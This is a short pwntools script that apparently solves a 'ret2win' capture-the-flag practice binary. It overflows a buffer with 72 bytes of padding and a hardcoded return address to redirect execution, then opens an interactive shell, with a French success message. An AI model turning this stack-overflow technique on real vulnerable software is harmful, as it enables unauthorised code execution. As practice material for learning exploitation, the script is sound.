from pwn import *

exe = "./ret2win"
elf = context.binary = ELF(exe, checksec=False)

def solve():

    padding = b"A" * 72

    full_address = pack(0x401203, 64)

    payload = padding + full_address.rstrip(b"\x00")

    io = process([exe, payload])
    print(io.recvuntil(b"ex\xc3\xa9cut\xc3\xa9e!").decode(errors='ignore'))
    
    log.success("Exploit réussi ! Le shell est prêt. Tape 'id' ou 'ls' :")

    io.interactive()

if __name__ == "__main__":
    solve()
